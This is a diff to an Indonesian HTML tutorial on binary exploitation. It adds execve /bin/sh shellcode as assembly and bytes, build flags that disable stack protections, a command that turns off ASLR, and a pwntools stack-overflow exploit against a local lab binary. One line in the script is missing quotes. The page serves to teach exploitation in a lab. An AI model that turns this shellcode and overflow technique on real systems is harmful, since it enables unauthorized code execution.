@@ -323,7 +323,7 @@
             <div id="content" class="content">
                 <main>
                     <!-- ----------------------------------------------- DIGANTI MENU ----------------------------------------------- -->
-                    <h1><a class="header" href="#intro" id="intro">Intro</a></h1>
+                    <h1><a class="header" href="#intro" id="intro">Binary Exploitation : pwn & shellcode</a></h1>
                     <p>source code : <br> <pre><code>#include<stdio.h>
 #include<unistd.h>
                         
@@ -339,6 +339,88 @@ int main(){
 <p>Makefile : (asumsi nama file shellcode.c)<br> 
 <pre><code>gcc -no-pie -fno-pic -fno-stack-protector -fno-builtin -mpreferred-stack-boundary=2 -m32 -z execstack shellcode.c -o shellcode</code></pre>
 </p>
+                    <p>link shellcode <a href="http://shell-storm.org" target="_blank">http://shell-storm.org</a><br>
+                    untuk dapat mengakses ke <code>/bin/bash</code> menggunakan kode <a href="http://shell-storm.org/shellcode/files/shellcode-752.php" target="_blank">assembly</a>
+                    <br><br>
+                    assembly untuk menjalankan perintah /bin/sh
+                    </p>
+
+<pre><code>xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f   ;; hs//
+push 0x6e69622f   ;; nib/
+mov ebx, esp
+mov al, 11
+int 0x80</code></pre>
+program python untuk mendapatkan line assembly : <pre><code>from pwn import *
+
+kode = '''
+xor ecx, ecx
+mul ecx
+push ecx
+push 0x68732f2f   ;; hs//
+push 0x6e69622f   ;; nib/
+mov ebx, esp
+mov al, 11
+int 0x80
+'''
+
+bentuk_line = asm(kode)
+dikembalikan_bentuk_kode = disasm(bentuk_line)
+</code></pre>
+dalam bentuk line : (yang akan digunakan sebagai payload)
+<pre><code>\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+</code></pre>
+
+                    <p><br> syarat & tahap : <br> 
+                        <ul>
+                            <li>dalam bentuk stack executable / disable execstack</li>
+                            <li>mengetahui alamat buffer</li>
+                            <li>ada 2 seri : aslr/randomize memory off dan aslr/randomize memory on (untuk belajar, di off-kan dulu) <br>
+                                <pre><code>echo "0" > /proc/sys/kernel/randomize_va_space</code><br>"0" untuk off, "1" untuk on</pre>
+                            </li>
+                        </ul>
+                    </p>
+                    <br>
+                    <img src="../gambar/gamb1.png" alt="gdb">
+<pre><code>0x08049204 <+46>:	lea    eax,[ebp-0x40]
+0x08049207 <+49>:	push   eax
+0x08049208 <+50>:	push   0x0
+0x0804920a <+52>:	call   0x8049080 <read@plt>
+</code></pre>
+    <p>proses <code>read</code> pada <code>[ebp-0x40]</code> </p>
+
+    <p>ide : <br>
+    <code>shellcode + 'A'*(offset - len(shellcode)) + memori_buff</code>
+    </p>
+
+    <p><br><br>Maka didapat code python : <br>
+        <pre><code class="lang-html">from pwn import *
+import struct
+
+context(arch='i386', os='linux')
+
+# jalankan program
+p = process(./shellcode)
+
+p.recvuntil("Buffer ada di: ")
+buff = int(p.recvline(),16)
+
+offset = 68
+memori_buff = struct.pack("&lt;I", buff)
+
+shellcode = '<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>80'
+
+payload = shellcode + 'A'*(offset - len(shellcode)) + memori_buff
+
+p.sendline(payload+'<span class="hljs-symbol">\n</span>')
+
+p.interactive()
+            </code></pre>
+            
+            
+    </p>
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
                 </main>
 
